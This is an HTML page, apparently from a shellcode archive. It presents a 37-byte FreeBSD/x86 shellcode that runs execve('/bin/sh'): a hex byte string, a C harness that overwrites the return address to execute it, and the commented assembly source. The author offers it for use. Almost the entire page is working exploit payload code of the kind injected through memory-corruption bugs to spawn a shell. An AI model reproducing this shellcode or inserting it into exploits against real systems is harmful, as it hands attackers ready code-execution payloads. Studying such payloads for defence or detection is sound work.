<html><head><title>FreeBSD/x86 - execve /bin/sh 37 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* This is FreeBSD execve() code.It is 37 bytes long.I'll try to make it *
 * smaller.Till then use this one.                                       *
 *                                       signed predator                 *
 *                                       preedator(at)sendmail(dot)ru    *
 *************************************************************************/

char FreeBSD_code[]=
&quot;\xeb\x17\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x50\x8d&quot;
&quot;\x53\x08\x52\x53\xb0\x3b\x50\xcd\x80\xe8\xe4\xff\xff\xff/bin/sh&quot;;

int main(){
 int *ret=(int *)(&amp;ret+2);
 printf(&quot;len : %d\n&quot;,strlen(FreeBSD_code));
 *ret=(int)FreeBSD_code;
}

/*****************************************
 *int main(){                            *
 *   __asm__(&quot;jmp  callme         \n&quot;    *
 *           &quot;jmpme:              \n&quot;    *
 *           &quot;pop %ebx            \n&quot;    *
 *           &quot;xorl %eax,%eax      \n&quot;    *
 *           &quot;movb %al,0x7(%ebx)  \n&quot;    *
 *           &quot;movl %ebx,0x8(%ebx) \n&quot;    *
 *	     &quot;movl %eax,0xc(%ebx) \n&quot;    *
 *           &quot;push %eax           \n&quot;    *
 *	     &quot;leal 0x8(%ebx),%edx \n&quot;    *
 *	     &quot;push %edx           \n&quot;    *
 *	     &quot;push %ebx           \n&quot;    *
 *	     &quot;movb $0x3b,%al      \n&quot;    *
 *           &quot;push %eax	          \n&quot;    *
 *           &quot;int $0x80           \n&quot;    *
 *           &quot;callme:	          \n&quot;    *
 *           &quot;call jmpme          \n&quot;    *
 *           &quot;.string \&quot;/bin/sh\&quot; \n&quot;);  *
 *}                                      *
 *****************************************/



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
